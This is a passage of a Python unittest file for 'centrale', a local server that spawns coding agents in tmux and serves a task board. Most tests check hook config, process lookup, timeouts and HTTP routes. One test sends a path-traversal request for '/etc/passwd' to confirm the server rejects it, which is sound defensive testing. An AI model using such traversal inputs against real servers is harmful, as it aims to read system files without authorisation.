        second_mtime = os.stat(self.settings_path).st_mtime_ns
        self.assertGreaterEqual(second_mtime, first_mtime)


class CodexHooksOverridesTests(unittest.TestCase):
    """Hermetic tests for server.codex_hooks_overrides() (task-44):
    codex's project config layer resolves through a linked worktree's
    `.git` FILE to the main repo root, so the hooks.json file task-42
    used to write into the worktree was never actually discovered in
    the environment centrale spawns into -- these four -c inline config
    overrides replace it. Pure/no I/O, so nothing here needs mocking;
    each value is verified to be real, parseable TOML (via the stdlib
    tomllib) carrying the exact schema codex's own hooks.json expects."""

    def test_returns_four_dash_c_pairs_in_the_documented_order(self):
        overrides = server.codex_hooks_overrides()
        self.assertEqual(len(overrides), 8)
        flags = overrides[0::2]
        self.assertEqual(flags, ["-c"] * 4)
        points = [value.split("=", 1)[0] for value in overrides[1::2]]
        self.assertEqual(points, ["hooks.UserPromptSubmit", "hooks.PreToolUse", "hooks.PermissionRequest", "hooks.Stop"])

    def test_each_override_value_is_valid_toml_matching_codexs_schema(self):
        import tomllib

        overrides = server.codex_hooks_overrides()
        notify = server.notify_script_path()
        expected_state = {
            "UserPromptSubmit": "working",
            "PreToolUse": "working",
            "PermissionRequest": "waiting",
            "Stop": "finished",
        }
        for value in overrides[1::2]:
            point, _, toml_value = value.partition("=")
            point = point[len("hooks."):]
            doc = tomllib.loads(f"{point}={toml_value}")
            hook = doc[point][0]["hooks"][0]
            self.assertEqual(hook["type"], "command")
            self.assertEqual(hook["command"], f"python3 {notify} {expected_state[point]}")

    def test_permission_request_is_the_waiting_equivalent_not_notification(self):
        # Codex has no Notification hook point (unlike claude's settings
        # file) -- PermissionRequest is its waiting-state equivalent.
        overrides = server.codex_hooks_overrides()
        points = [value.split("=", 1)[0] for value in overrides[1::2]]
        self.assertNotIn("hooks.Notification", points)
        self.assertIn("hooks.PermissionRequest", points)

    def test_command_string_is_shlex_quoted_for_a_spaced_notify_script_path(self):
        # AGENTS.md: use realistic spaced paths in git-path-shaped tests --
        # quoting mismatches hide there. notify_script_path is patched to
        # a spaced path to prove the command survives shlex.join intact
        # inside the TOML string (see server._codex_hooks_override).
        import tomllib

        with mock.patch.object(server, "notify_script_path", return_value="/abs/centrale notify.py"):
            overrides = server.codex_hooks_overrides()

        _, _, toml_value = overrides[1].partition("=")
        doc = tomllib.loads(f"hooks.UserPromptSubmit={toml_value}")
        command = doc["hooks"]["UserPromptSubmit"][0]["hooks"][0]["command"]
        self.assertEqual(shlex.split(command), ["python3", "/abs/centrale notify.py", "working"])


class ProbeCodexHookTrustTests(unittest.TestCase):
    """Hermetic tests for server.probe_codex_hook_trust (task-42, added on
    review): real feature-detection of codex's
    --dangerously-bypass-hook-trust flag via `<binary> --help`, gating
    whether spawn.py's codex branch ever appends the four inline hooks
    overrides and the trust flag at all (task-44) -- an older codex
    doesn't recognize the flag and would reject the whole argv at
    startup if it were appended blindly. server._run is mocked
    throughout; this must never shell out to a real codex binary, even
    though one may genuinely be installed on the machine running this
    suite."""

    def setUp(self):
        server._reset_codex_hook_trust_probe_cache()
        self.addCleanup(server._reset_codex_hook_trust_probe_cache)

    def _help_proc(self, stdout="", stderr="", returncode=0):
        return subprocess.CompletedProcess(["codex", "--help"], returncode, stdout, stderr)

    def test_true_when_help_output_advertises_the_flag(self):
        with mock.patch.object(server, "_run", return_value=self._help_proc(
            stdout="Usage: codex ...\n  --dangerously-bypass-hook-trust  ...\n"
        )):
            self.assertTrue(server.probe_codex_hook_trust("codex"))

    def test_false_when_help_output_lacks_the_flag(self):
        with mock.patch.object(server, "_run", return_value=self._help_proc(
            stdout="Usage: codex ...\n  --some-other-flag  ...\n"
        )):
            self.assertFalse(server.probe_codex_hook_trust("codex"))

    def test_checks_stderr_too_not_just_stdout(self):
        # --help conventions vary across CLI versions/builds.
        with mock.patch.object(server, "_run", return_value=self._help_proc(
            stderr="  --dangerously-bypass-hook-trust  ...\n"
        )):
            self.assertTrue(server.probe_codex_hook_trust("codex"))

    def test_not_gated_on_returncode_zero(self):
        # Some --help invocations exit non-zero; the flag's presence in
        # the combined output is still a valid positive signal.
        with mock.patch.object(server, "_run", return_value=self._help_proc(
            stdout="--dangerously-bypass-hook-trust\n", returncode=1
        )):
            self.assertTrue(server.probe_codex_hook_trust("codex"))

    def test_missing_binary_is_false_never_raises(self):
        # _run() synthesizes a returncode=127 CompletedProcess for a
        # missing binary (see _run's own FileNotFoundError handling) --
        # never a raised exception.
        with mock.patch.object(server, "_run", return_value=self._help_proc(
            stdout="", stderr="[Errno 2] No such file or directory: 'nonexistent-codex'", returncode=127
        )):
            self.assertFalse(server.probe_codex_hook_trust("nonexistent-codex"))

    def test_result_is_cached_per_binary_path(self):
        with mock.patch.object(server, "_run", return_value=self._help_proc(
            stdout="--dangerously-bypass-hook-trust\n"
        )) as run:
            first = server.probe_codex_hook_trust("codex")
            second = server.probe_codex_hook_trust("codex")
        self.assertTrue(first)
        self.assertTrue(second)
        run.assert_called_once_with(["codex", "--help"], timeout=5)

    def test_cache_is_keyed_per_binary_path(self):
        def fake_run(cmd, timeout):
            if cmd[0] == "codex-new":
                return self._help_proc(stdout="--dangerously-bypass-hook-trust\n")
            return self._help_proc(stdout="no such flag here\n")

        with mock.patch.object(server, "_run", side_effect=fake_run) as run:
            self.assertTrue(server.probe_codex_hook_trust("codex-new"))
            self.assertFalse(server.probe_codex_hook_trust("codex-old"))
            # Each distinct binary path probed once, not merged together.
            self.assertEqual(run.call_count, 2)

    def test_reset_helper_clears_the_cache(self):
        with mock.patch.object(server, "_run", return_value=self._help_proc(
            stdout="--dangerously-bypass-hook-trust\n"
        )) as run:
            server.probe_codex_hook_trust("codex")
            server._reset_codex_hook_trust_probe_cache()
            server.probe_codex_hook_trust("codex")
        self.assertEqual(run.call_count, 2)


class CapabilitiesTests(unittest.TestCase):
    """Hermetic tests for tmux-availability detection (task-18): the
    shutil.which boundary is patched via server.which, never the real
    PATH, so these never depend on whether tmux happens to be installed
    on the machine running the suite."""

    def test_detect_capabilities_tmux_present(self):
        with mock.patch.object(server, "which", return_value="/usr/bin/tmux"):
            self.assertEqual(server.detect_capabilities(), {"tmux": True})

    def test_detect_capabilities_tmux_missing(self):
        with mock.patch.object(server, "which", return_value=None):
            self.assertEqual(server.detect_capabilities(), {"tmux": False})

    def test_detect_capabilities_checks_tmux_specifically(self):
        with mock.patch.object(server, "which") as which:
            which.return_value = "/usr/bin/tmux"
            server.detect_capabilities()
        which.assert_called_once_with("tmux")

    def test_tmux_capability_defaults_true_when_capabilities_key_absent(self):
        self.assertTrue(server.tmux_capability({}))
        self.assertTrue(server.tmux_capability(make_config([])))

    def test_tmux_capability_reads_explicit_value(self):
        self.assertFalse(server.tmux_capability({"capabilities": {"tmux": False}}))
        self.assertTrue(server.tmux_capability({"capabilities": {"tmux": True}}))


class SubprocessTimeoutTests(unittest.TestCase):
    """Task-28: every subprocess boundary (run_backlog, run_backlog_raw,
    run_git, run_tmux) shares one configurable timeout
    (configure_subprocess_timeout), read from _subprocess_timeout_seconds
    at call time -- verified here by mocking subprocess.run itself (the
    one level below these boundaries) and checking the `timeout=` kwarg
    it receives, restoring the module's default afterward so this
    doesn't leak into other tests."""

    def setUp(self):
        self.addCleanup(server.configure_subprocess_timeout, server.DEFAULT_SUBPROCESS_TIMEOUT_SECONDS)

    def test_configure_subprocess_timeout_changes_the_shared_value(self):
        server.configure_subprocess_timeout(5)
        self.assertEqual(server._subprocess_timeout_seconds, 5)

    def _assert_uses_configured_timeout(self, call_fn):
        server.configure_subprocess_timeout(7)
        # Valid enough output for any of run_backlog/run_backlog_raw/
        # run_git/run_tmux to accept without raising -- run_backlog is
        # the pickiest (parses stdout as JSON).
        completed = subprocess.CompletedProcess([], 0, "{}", "")
        with mock.patch("subprocess.run", return_value=completed) as run:
            call_fn()
        self.assertEqual(run.call_args.kwargs["timeout"], 7)

    def test_run_backlog_uses_configured_timeout(self):
        self._assert_uses_configured_timeout(
            lambda: server.run_backlog(["task", "list", "--json"], cwd="/repos/my-app")
        )

    def test_run_backlog_raw_uses_configured_timeout(self):
        self._assert_uses_configured_timeout(
            lambda: server.run_backlog_raw(["task", "edit", "TASK-1"], cwd="/repos/my-app")
        )

    def test_run_git_uses_configured_timeout(self):
        self._assert_uses_configured_timeout(lambda: server.run_git(["status"], cwd="/repos/my-app"))

    def test_run_tmux_uses_configured_timeout(self):
        self._assert_uses_configured_timeout(lambda: server.run_tmux(["list-sessions"]))

    def test_run_tmux_feeds_input_to_stdin_only_when_given(self):
        # task-72: reply text reaches `tmux load-buffer -` as the child's
        # stdin -- and every other tmux call keeps stdin untouched.
        completed = subprocess.CompletedProcess([], 0, "", "")
        with mock.patch("subprocess.run", return_value=completed) as run:
            server.run_tmux(["load-buffer", "-b", "centrale-reply-x", "-"], input="-- yes; go")
        self.assertEqual(run.call_args.args[0], ["tmux", "load-buffer", "-b", "centrale-reply-x", "-"])
        self.assertEqual(run.call_args.kwargs["input"], "-- yes; go")
        self.assertTrue(run.call_args.kwargs["text"])
        with mock.patch("subprocess.run", return_value=completed) as run:
            server.run_tmux(["send-keys", "-t", "=x:", "Enter"])
        self.assertIsNone(run.call_args.kwargs["input"])

    def test_subprocess_timeout_expired_becomes_returncode_124(self):
        # The shared style every _run() caller already relies on for a
        # missing binary (127) applies identically to a timeout.
        with mock.patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd=["git"], timeout=30)):
            proc = server.run_git(["status"], cwd="/repos/my-app")
        self.assertEqual(proc.returncode, 124)

    def test_run_check_command_default_timeout_is_the_long_one(self):
        completed = subprocess.CompletedProcess([], 0, "", "")
        with mock.patch("subprocess.run", return_value=completed) as run:
            server.run_check_command("make test", cwd="/repos/my-app")
        self.assertEqual(run.call_args.kwargs["timeout"], server.DEFAULT_CHECK_TIMEOUT_SECONDS)

    def test_run_check_command_honors_explicit_timeout_override(self):
        completed = subprocess.CompletedProcess([], 0, "", "")
        with mock.patch("subprocess.run", return_value=completed) as run:
            server.run_check_command("make test", cwd="/repos/my-app", timeout=45)
        self.assertEqual(run.call_args.kwargs["timeout"], 45)


class PortIsFreeTests(unittest.TestCase):
    """port_is_free is itself the injectable boundary browser.py's tests
    mock -- so unlike every other test in this suite, it's fine (per
    task-27's spec) for these to use a real, local-only socket bind:
    there's nothing further downstream to fake."""

    def test_true_for_a_port_nothing_is_listening_on(self):
        import socket

        # Bind briefly to learn an OS-assigned free port, then release it
        # immediately -- a tiny TOCTOU window, but good enough to prove
        # the happy path works against a real socket.
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as probe:
            probe.bind(("127.0.0.1", 0))
            free_port = probe.getsockname()[1]
        self.assertTrue(server.port_is_free(free_port))

    def test_false_for_a_port_currently_bound(self):
        import socket

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as holder:
            holder.bind(("127.0.0.1", 0))
            holder.listen(1)
            occupied_port = holder.getsockname()[1]
            self.assertFalse(server.port_is_free(occupied_port))


class ResolveListenerPidTests(unittest.TestCase):
    """Task-32: `backlog browser` is a node wrapper that immediately
    forks the real listening server, which reparents away -- the pid a
    Popen handle tracks is the wrapper, not the real listener.
    resolve_listener_pid(port) is how browser.py learns the real one, by
    shelling out to `ss` and, since task-105, falling back to `lsof`
    where `ss` produced nothing (macOS/BSD have no `ss` at all; a
    locked-down Linux `ss` omits the pid without root). Both are mocked
    here one level below, at subprocess.run, same convention as
    SubprocessTimeoutTests -- never a real `ss` or `lsof`."""

    def _ss_output(self, pid):
        return (
            "State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess\n"
            f"LISTEN 0      512             127.0.0.1:6421       0.0.0.0:*    "
            f'users:(("backlog",pid={pid},fd=13))\n'
        )

    def _lsof_output(self, pid, port=6421):
        return (
            "COMMAND     PID    USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME\n"
            f"node    {pid} user      23u  IPv4 70094301      0t0  TCP "
            f"127.0.0.1:{port} (LISTEN)\n"
        )

    def _dispatch(self, ss=None, lsof=None):
        """A subprocess.run replacement that answers `ss` and `lsof`
        differently -- the only way to exercise the fallback, since both
        halves go through the same _run boundary. A tool mapped to None
        behaves as if it isn't on PATH at all."""

        def run(cmd, *args, **kwargs):
            answer = {"ss": ss, "lsof": lsof}.get(cmd[0])
            if answer is None:
                raise FileNotFoundError(f"no {cmd[0]}")
            return subprocess.CompletedProcess(cmd, 0, answer, "")

        return run

    def test_parses_pid_from_real_looking_ss_output(self):
        completed = subprocess.CompletedProcess([], 0, self._ss_output(54031), "")
        with mock.patch("subprocess.run", return_value=completed):
            self.assertEqual(server.resolve_listener_pid(6421), 54031)

    def test_invokes_ss_filtered_to_the_exact_port(self):
        completed = subprocess.CompletedProcess([], 0, self._ss_output(54031), "")
        with mock.patch("subprocess.run", return_value=completed) as run:
            server.resolve_listener_pid(6421)
        args = run.call_args.args[0]
        self.assertEqual(args, ["ss", "-tlnp", "sport = :6421"])

    def test_returns_none_when_nothing_is_listening(self):
        header_only = "State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess\n"
        completed = subprocess.CompletedProcess([], 0, header_only, "")
        with mock.patch("subprocess.run", return_value=completed):
            self.assertIsNone(server.resolve_listener_pid(6421))

    def test_returns_none_when_ss_itself_fails(self):
        completed = subprocess.CompletedProcess([], 1, "", "ss: command not found")
        with mock.patch("subprocess.run", return_value=completed):
            self.assertIsNone(server.resolve_listener_pid(6421))

    def test_returns_none_when_ss_missing_from_path(self):
        with mock.patch("subprocess.run", side_effect=FileNotFoundError("no ss")):
            self.assertIsNone(server.resolve_listener_pid(6421))

    def test_returns_none_when_output_has_no_pid_detail(self):
        # A locked-down `ss` some systems ship omits the process column
        # entirely without root -- degrade to None, not a crash.
        no_pid_line = (
            "State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess\n"
            "LISTEN 0      512             127.0.0.1:6421       0.0.0.0:*\n"
        )
        completed = subprocess.CompletedProcess([], 0, no_pid_line, "")
        with mock.patch("subprocess.run", return_value=completed):
            self.assertIsNone(server.resolve_listener_pid(6421))

    # -- task-105: the non-Linux (`lsof`) branch, exercised on Linux ----

    def test_falls_back_to_lsof_when_ss_is_not_on_path(self):
        # The macOS/BSD shape: no `ss` in existence, `lsof` answers.
        with mock.patch("subprocess.run", side_effect=self._dispatch(lsof=self._lsof_output(54031))):
            self.assertEqual(server.resolve_listener_pid(6421), 54031)

    def test_invokes_lsof_filtered_to_the_exact_port(self):
        with mock.patch(
            "subprocess.run", side_effect=self._dispatch(lsof=self._lsof_output(54031))
        ) as run:
            server.resolve_listener_pid(6421)
        lsof_calls = [c.args[0] for c in run.call_args_list if c.args[0][0] == "lsof"]
        self.assertEqual(lsof_calls, [["lsof", "-nP", "-iTCP:6421", "-sTCP:LISTEN"]])

    def test_falls_back_to_lsof_when_ss_omits_the_pid_detail(self):
        # Locked-down Linux `ss`: it runs and exits 0 but names no pid.
        # `lsof` gets a second try rather than the caller degrading.
        no_pid_line = (
            "State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess\n"
            "LISTEN 0      512             127.0.0.1:6421       0.0.0.0:*\n"
        )
        with mock.patch(
            "subprocess.run",
            side_effect=self._dispatch(ss=no_pid_line, lsof=self._lsof_output(54031)),
        ):
            self.assertEqual(server.resolve_listener_pid(6421), 54031)

    def test_never_shells_out_to_lsof_when_ss_already_answered(self):
        # Linux fast path must stay exactly one process, as before.
        with mock.patch(
            "subprocess.run",
            side_effect=self._dispatch(ss=self._ss_output(54031), lsof=self._lsof_output(999)),
        ) as run:
            self.assertEqual(server.resolve_listener_pid(6421), 54031)
        self.assertEqual([c.args[0][0] for c in run.call_args_list], ["ss"])

    def test_returns_none_when_neither_ss_nor_lsof_exists(self):
        with mock.patch("subprocess.run", side_effect=self._dispatch()):
            self.assertIsNone(server.resolve_listener_pid(6421))

    def test_takes_the_first_listen_row_when_lsof_prints_several(self):
        both_families = (
            "COMMAND     PID    USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME\n"
            "node     54031 user      23u  IPv4 70094301      0t0  TCP 127.0.0.1:6421 (LISTEN)\n"
            "node     54031 user      24u  IPv6 70094302      0t0  TCP [::1]:6421 (LISTEN)\n"
        )
        with mock.patch("subprocess.run", side_effect=self._dispatch(lsof=both_families)):
            self.assertEqual(server.resolve_listener_pid(6421), 54031)

    def test_ignores_lsof_rows_that_are_not_listening_sockets(self):
        # Fail-closed: an established connection's row (or a warning
        # banner lsof printed first) must never be mistaken for a
        # listener pid a caller would then go on to kill.
        noise = (
            "lsof: WARNING: can't stat() nfs file system /mnt/share\n"
            "COMMAND     PID    USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME\n"
            "curl     41234 user       5u  IPv4 70094303      0t0  TCP "
            "127.0.0.1:52344->127.0.0.1:6421 (ESTABLISHED)\n"
        )
        with mock.patch("subprocess.run", side_effect=self._dispatch(lsof=noise)):
            self.assertIsNone(server.resolve_listener_pid(6421))

    def test_ignores_an_lsof_row_whose_pid_column_is_not_a_number(self):
        garbled = (
            "COMMAND     PID    USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME\n"
            "node       n/a user      23u  IPv4 70094301      0t0  TCP 127.0.0.1:6421 (LISTEN)\n"
        )
        with mock.patch("subprocess.run", side_effect=self._dispatch(lsof=garbled)):
            self.assertIsNone(server.resolve_listener_pid(6421))


class ProcessCmdlineTests(unittest.TestCase):
    """Task-105: process_cmdline used to be Linux-only (/proc), so on
    macOS it returned None for every pid and
    browser.sweep_orphaned_browsers() silently reaped nothing. It now
    falls back to `ps`. Both branches are exercised here on whatever
    platform CI runs: the procfs read is mocked at builtins.open, the
    `ps` call at subprocess.run -- no real process is ever inspected
    except in the one clearly-marked Linux-only test at the end."""

    CMDLINE = "node /usr/lib/node_modules/backlog.md/cli.js browser --port 6421"

    def _procfs(self, *parts):
        return mock.mock_open(read_data=b"\x00".join(parts) + b"\x00")

    def test_reads_procfs_and_never_shells_out_when_proc_is_available(self):
        opener = self._procfs(b"node", b"/usr/lib/backlog/cli.js", b"browser", b"--port", b"6421")
        with mock.patch("builtins.open", opener), \
             mock.patch("subprocess.run") as run:
            cmdline = server.process_cmdline(54031)
        self.assertEqual(cmdline, "node /usr/lib/backlog/cli.js browser --port 6421")
        run.assert_not_called()

    def test_falls_back_to_ps_when_there_is_no_procfs(self):
        # The macOS/BSD shape: /proc doesn't exist, so the open fails
        # with ENOENT for every pid and `ps` is the only answer.
        completed = subprocess.CompletedProcess([], 0, self.CMDLINE + "\n", "")
        with mock.patch("builtins.open", side_effect=FileNotFoundError("no /proc")), \
             mock.patch("subprocess.run", return_value=completed) as run:
            self.assertEqual(server.process_cmdline(54031), self.CMDLINE)
        self.assertEqual(run.call_args.args[0], ["ps", "-ww", "-o", "command=", "-p", "54031"])

    def test_falls_back_to_ps_when_the_procfs_read_is_denied(self):
        completed = subprocess.CompletedProcess([], 0, self.CMDLINE + "\n", "")
        with mock.patch("builtins.open", side_effect=PermissionError("hidepid")), \
             mock.patch("subprocess.run", return_value=completed):
            self.assertEqual(server.process_cmdline(54031), self.CMDLINE)

    def test_falls_back_to_ps_when_procfs_gives_an_empty_cmdline(self):
        # A kernel thread (or a zombie) has an empty /proc cmdline.
        completed = subprocess.CompletedProcess([], 0, "[kworker/3:1]\n", "")
        with mock.patch("builtins.open", mock.mock_open(read_data=b"")), \
             mock.patch("subprocess.run", return_value=completed):
            self.assertEqual(server.process_cmdline(54031), "[kworker/3:1]")

    def test_returns_none_when_ps_does_not_know_the_pid(self):
        # Fail-closed: neither method can say what this pid is, so
        # browser._kill_if_still_matches must get None and kill nothing.
        completed = subprocess.CompletedProcess([], 1, "", "")
        with mock.patch("builtins.open", side_effect=FileNotFoundError("no /proc")), \
             mock.patch("subprocess.run", return_value=completed):
            self.assertIsNone(server.process_cmdline(54031))

    def test_returns_none_when_ps_is_missing_from_path(self):
        with mock.patch("builtins.open", side_effect=FileNotFoundError("no /proc")), \
             mock.patch("subprocess.run", side_effect=FileNotFoundError("no ps")):
            self.assertIsNone(server.process_cmdline(54031))

    def test_returns_none_when_ps_prints_a_blank_line(self):
        completed = subprocess.CompletedProcess([], 0, "\n", "")
        with mock.patch("builtins.open", side_effect=FileNotFoundError("no /proc")), \
             mock.patch("subprocess.run", return_value=completed):
            self.assertIsNone(server.process_cmdline(54031))

    @unittest.skipUnless(sys.platform.startswith("linux"), "procfs is Linux-only")
    def test_reads_the_real_procfs_entry_for_this_process(self):
        # The one test that exercises the procfs branch for real rather
        # than mocking it -- a plain read of our own /proc entry, safe to
        # run (never writes, never signals anything).
        self.assertIn("python", (server.process_cmdline(os.getpid()) or "").lower())

    def test_ps_reports_the_real_cmdline_of_this_process(self):
        # The `ps` branch for real, on whatever platform CI runs: `ps -ww
        # -o command= -p <pid>` is portable enough to answer on Linux
        # too, which is the only way to check the argv this ships is
        # actually accepted somewhere. Read-only, our own pid.
        cmdline = server._cmdline_from_ps(os.getpid())
        if cmdline is None:
            self.skipTest("no usable `ps` on this machine")
        self.assertIn("python", cmdline.lower())


class TerminateHandlerTests(unittest.TestCase):
    """Task-27: SIGTERM must trigger the same cleanup as a normal exit
    (atexit hooks -- browser.py's launched-child terminator among them --
    never run on the OS default SIGTERM action). Hermetic: signal.signal
    itself is mocked, so nothing here ever installs a real handler or
    touches actual process signal state."""

    def test_registers_sigterm_and_sigint_handlers(self):
        import signal

        with mock.patch("signal.signal") as sig:
            server.install_terminate_handlers()

        registered = {c.args[0]: c.args[1] for c in sig.call_args_list}
        self.assertIn(signal.SIGTERM, registered)
        self.assertIn(signal.SIGINT, registered)

    def test_installed_handler_raises_terminate_requested(self):
        import signal

        captured = {}

        def fake_signal(signum, handler):
            captured[signum] = handler

        with mock.patch("signal.signal", side_effect=fake_signal):
            server.install_terminate_handlers()

        with self.assertRaises(server._TerminateRequested):
            captured[signal.SIGTERM](signal.SIGTERM, None)
        with self.assertRaises(server._TerminateRequested):
            captured[signal.SIGINT](signal.SIGINT, None)

    def test_terminate_requested_is_a_system_exit(self):
        # main()'s except clause (and any other well-behaved cleanup code
        # up the stack) must be able to catch this the same way it
        # already catches KeyboardInterrupt / SystemExit.
        self.assertTrue(issubclass(server._TerminateRequested, SystemExit))


class BindFailureTests(unittest.TestCase):
    """Task-28: an occupied main port must produce one clear line naming
    the port and the likely cause, not a raw traceback."""

    def test_message_names_the_port_and_likely_cause(self):
        msg = server.bind_failure_message(("127.0.0.1", 7420), OSError("Address already in use"))
        self.assertIn("7420", msg)
        self.assertIn("127.0.0.1", msg)
        self.assertIn("Address already in use", msg)
        self.assertIn("another Centrale instance", msg)

    def test_centrale_http_server_raises_oserror_on_an_already_bound_port(self):
        # Real socket collision (no external process, no mocking needed)
        # -- confirms the precondition main()'s try/except OSError
        # actually fires on: CentraleHTTPServer itself raises OSError for
        # a port something else already holds, same as any TCPServer.
        holder = server.CentraleHTTPServer(("127.0.0.1", 0), server.Handler, make_config([]))
        self.addCleanup(holder.server_close)
        taken_port = holder.server_address[1]

        with self.assertRaises(OSError):
            server.CentraleHTTPServer(("127.0.0.1", taken_port), server.Handler, make_config([]))


class HttpApiTests(unittest.TestCase):
    """End-to-end tests against a real ThreadingHTTPServer bound to
    127.0.0.1:0, with the subprocess boundary functions mocked."""

    @classmethod
    def setUpClass(cls):
        cls.my_app_dir = os.path.dirname(os.path.abspath(__file__))
        cls.config = make_config([{"name": "my-app", "path": cls.my_app_dir}])
        cls.httpd = server.CentraleHTTPServer(("127.0.0.1", 0), server.Handler, cls.config)
        cls.port = cls.httpd.server_address[1]
        import threading

        cls.thread = threading.Thread(target=cls.httpd.serve_forever, daemon=True)
        cls.thread.start()

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.httpd.server_close()
        cls.thread.join(timeout=5)

    def setUp(self):
        server._reset_board_cache()
        server._reset_agent_events()
        server._reset_pane_capture_times()

    def _url(self, path):
        return f"http://127.0.0.1:{self.port}{path}"

    def _get(self, path):
        try:
            with urllib.request.urlopen(self._url(path), timeout=5) as resp:
                return resp.status, json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as exc:
            return exc.code, json.loads(exc.read().decode("utf-8"))

    def _post(self, path, body_bytes=b"", headers=None):
        req = urllib.request.Request(
            self._url(path), data=body_bytes, method="POST",
            headers=headers or {"Content-Type": "application/json"},
        )
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.status, json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as exc:
            return exc.code, json.loads(exc.read().decode("utf-8"))

    def _post_json(self, path, payload):
        """POST a JSON object body -- the only shape the state-changing
        endpoints accept since task-99 (identity included; there is no
        query-parameter form any more)."""
        return self._post(path, json.dumps(payload).encode("utf-8"))

    def _raw(self, method, path, headers=None, body=None):
        """One request with exactly the headers given, and nothing else
        added behind our back. http.client rather than urllib because
        task-122's shapes turn on headers urllib will not let go of: it
        appends its own Host, and it refuses to omit Content-Type on a
        request with a body. Returns (status, raw body bytes) -- raw, so
        a test can assert a refusal disclosed no board content, which a
        json.loads() of an error object could not show.

        A supplied Host is honoured: http.client skips its own when the
        caller's headers already carry one (case-insensitively)."""
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=5)
        self.addCleanup(conn.close)
        conn.request(method, path, body=body, headers=dict(headers or {}))
        resp = conn.getresponse()
        return resp.status, resp.read()

    def test_root_serves_index_html(self):
        with urllib.request.urlopen(self._url("/"), timeout=5) as resp:
            self.assertEqual(resp.status, 200)
            self.assertTrue(resp.headers["Content-Type"].startswith("text/html"))
            self.assertIn("<html", resp.read().decode("utf-8").lower())

    def test_static_stylesheet_served_as_text_css(self):
        # task-82: the CSS moved out of index.html into static/styles.css;
        # the plain <link> relies on the static route sending a CSS
        # content type (mimetypes) and the exact bytes on disk.
        with urllib.request.urlopen(self._url("/static/styles.css"), timeout=5) as resp:
            self.assertEqual(resp.status, 200)
            self.assertTrue(resp.headers["Content-Type"].startswith("text/css"))
            self.assertEqual(resp.read().decode("utf-8"), load_static("styles.css"))

    def test_static_stylesheet_is_read_fresh_from_disk_per_request(self):
        # No caching layer: a stylesheet edit shows on the very next
        # request, no restart (task-82 AC #2). Served from a temp static
        # dir so the real file is never touched.
        tmp = tempfile.mkdtemp(prefix="centrale-static-")
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
        path = os.path.join(tmp, "styles.css")
        with open(path, "w", encoding="utf-8") as f:
            f.write("body { color: red; }\n")
        with mock.patch.object(server, "STATIC_DIR", tmp):
            with urllib.request.urlopen(self._url("/static/styles.css"), timeout=5) as resp:
                first = resp.read().decode("utf-8")
            with open(path, "w", encoding="utf-8") as f:
                f.write("body { color: blue; }\n")
            with urllib.request.urlopen(self._url("/static/styles.css"), timeout=5) as resp:
                self.assertTrue(resp.headers["Content-Type"].startswith("text/css"))
                second = resp.read().decode("utf-8")
        self.assertEqual(first, "body { color: red; }\n")
        self.assertEqual(second, "body { color: blue; }\n")

    def test_static_scripts_served_as_javascript(self):
        # task-83/89: the JS moved out of index.html and is now one file
        # per concern; each plain <script src> relies on the static route
        # sending a JavaScript content type (mimetypes) and the exact
        # bytes on disk. Every file index.html loads is checked, so a new
        # one cannot be added without this covering it.
        for name in FRONTEND_FILES:
            with self.subTest(name):
                with urllib.request.urlopen(self._url("/static/" + name), timeout=5) as resp:
                    self.assertEqual(resp.status, 200)
                    self.assertIn("javascript", resp.headers["Content-Type"])
                    self.assertEqual(resp.read().decode("utf-8"), load_static(name))

    def test_static_scripts_are_read_fresh_from_disk_per_request(self):
        # No caching layer and no build step: an edit to ANY of the
        # frontend files shows on the very next request, no restart
        # (task-89 AC #4). Served from a temp static dir so the real
        # files are never touched.
        tmp = tempfile.mkdtemp(prefix="centrale-static-")
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
        with mock.patch.object(server, "STATIC_DIR", tmp):
            for name in FRONTEND_FILES:
                with self.subTest(name):
                    path = os.path.join(tmp, name)
                    with open(path, "w", encoding="utf-8") as f:
                        f.write("var centrale = 1;\n")
                    with urllib.request.urlopen(self._url("/static/" + name), timeout=5) as resp:
                        first = resp.read().decode("utf-8")
                    with open(path, "w", encoding="utf-8") as f:
                        f.write("var centrale = 2;\n")
                    with urllib.request.urlopen(self._url("/static/" + name), timeout=5) as resp:
                        self.assertIn("javascript", resp.headers["Content-Type"])
                        second = resp.read().decode("utf-8")
                    self.assertEqual(first, "var centrale = 1;\n")
                    self.assertEqual(second, "var centrale = 2;\n")

    def test_static_favicon_served_as_svg(self):
        # task-90: the tab icon is a plain SVG under static/, served by the
        # same static route as the CSS and JS -- no build step, no CDN, no
        # binary blob. The <link> in index.html relies on this content type.
        with urllib.request.urlopen(self._url("/static/favicon.svg"), timeout=5) as resp:
            self.assertEqual(resp.status, 200)
            self.assertTrue(resp.headers["Content-Type"].startswith("image/svg+xml"))
            self.assertEqual(resp.read().decode("utf-8"), load_static("favicon.svg"))

    def test_favicon_ico_serves_the_icon_rather_than_404ing(self):
        # task-90: index.html declares the icon so browsers no longer guess
        # at this path, but a direct hit must not be the 404 that used to be
        # logged on every page load.
        with urllib.request.urlopen(self._url("/favicon.ico"), timeout=5) as resp:
            self.assertEqual(resp.status, 200)
            self.assertTrue(resp.headers["Content-Type"].startswith("image/svg+xml"))
            self.assertEqual(resp.read().decode("utf-8"), load_static("favicon.svg"))

    def test_static_path_traversal_is_rejected(self):
        status, body = self._get("/static/../../etc/passwd")
        self.assertIn(status, (400, 404))
        self.assertIn("error", body)

    def test_unknown_path_returns_404_json(self):
        status, body = self._get("/nope")
        self.assertEqual(status, 404)
        self.assertIn("error", body)

    def test_api_board_happy_path(self):
        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")

